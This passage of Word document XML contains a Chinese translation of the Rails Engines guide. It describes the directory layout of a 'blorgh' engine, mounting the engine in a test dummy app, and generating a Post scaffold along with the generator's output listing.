          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录，这里有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>images</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascripts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录，对其你应该感到和应用程序的很相似。*这里有一点不同无论在哪个目录下面都包含一个以 engine 名称命名的子文件*。因为这个 engine 是被名称空间化的，它的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也是一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0332FBE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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中这里有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录并且在里面有一个名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件。这个文件将会为 engine 的 ‘controller’ 提供常用的功能。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录也是这个 engine 的其它的 ‘controller’ 的所在。通过放置它们到这样的名称空间化的目录，你防止了在应用程序中的其它 engine 中的相同名称的 ’controller’与之冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F77D2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Engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类会这样命名 — 而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>EngineController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 主要是因为如果你这样思考，一个 engine 事实上只是一个 mini-application，这很有道理。你也可以转换一个应用程序到一个 engine 通过少量的相关的文字，这也是使得这个过程更容易的方式，尽管这里很微妙。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1288202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最后， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包含一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>layouts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹其包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh/application.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 它允许你为 engine 指定一个 ’layout’。如果这个 engine 被作为一个 单独的 engine 使用，那么你将会添加任何定制到他的 ‘layout’ 中，而不是应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/layouts/application.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B46356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如果你不希望强制一个 layout 给 engine 使用，那么你可以删除这个文件并且在你 engine 的 ‘controller’ 中引用一个不同的 ‘layout’.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7AD9CE"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 xml:space="preserve">2.1.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4702683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这个目录包含一个文件，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>script/rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，其让你能够使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 子命令并且就像你在应用程序中一样使用。这里意思是你会非常容易的为这个 engine 创建新的 ‘controllers’ 和 ’models’通过如下命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1560"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2CFAB160" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4264B82F" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1316104651"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rails g model</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2873829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注意，当然 engine 中的这些命令创建的任何事物，如果 ‘Engine’ 类中有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 都会被名称空间化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7265EF6F"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 xml:space="preserve">2.1.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9F7CF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test</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录是用来测试 engine 的。要测试 engine，这里有一个 cut-down 版的 rails 应用程序镶嵌在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。这个程序将会在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy/config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个文件挂载这个 engine。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="38F87CD9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4089211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Rails.application.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67C631C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mount Blorgh::Engine =&gt; "/blorgh"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3970D71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2FDA757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这行挂载 engine 到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径，其将会使得应用程序只能通过这个路径来访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD9078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在测试目录同样也有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/integration</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，这里是放置 engine 的集成测试。也可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中创建其他目录。例如，你可能希望创为你的单元测试创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2302DA2E"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3 为 engine 提供功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F78CE3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这个教程包含了提供文章和留言功能并且依照了 </w:t>
      </w:r>
      <w:hyperlink r:id="rId997" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Getting Started Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 相似的进程，和一些新的波折。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188C9E21"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3.1 创建一个 post 资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659B12A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创建一个博客 engine 的第一件事是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘model’ 以及相关的 ’controller’。要快速的创建这些，你可以使用 Rails 脚手架（scaffold）创建器。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4F381DCF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0927997E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="774449309"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate scaffold post title:string text:text</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36DC806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这条命令会输出这样的信息：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="07ACB239" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44364F4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active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="728C0D3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db/migrate/[timestamp]_create_blorgh_posts.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01E2E5B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app/models/blorgh/post.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7892AFD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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E716EB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test/unit/blorgh/post_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50B1C46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test/fixtures/blorgh/posts.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EC7FC9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route  resources :posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69329CB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scaffold_controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B2696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app/controllers/blorgh/posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="388351B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erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20E3A30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app/views/blorgh/posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57F1A4B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app/views/blorgh/posts/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C4A1A7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app/views/blorgh/posts/edit.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71E704D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app/views/blorgh/posts/show.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46B1F82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app/views/blorgh/posts/new.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3489219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app/views/blorgh/posts/_form.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BD9A32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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3753C83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test/functional/blorgh/posts_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="243575D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helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31F5D2D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app/helpers/blorgh/posts_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EA5EB2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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E3C073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test/unit/helpers/blorgh/posts_helper_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FEDE26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assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4414962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js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64D19AE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app/assets/javascripts/blorgh/posts.js</w:t>
            </w:r>
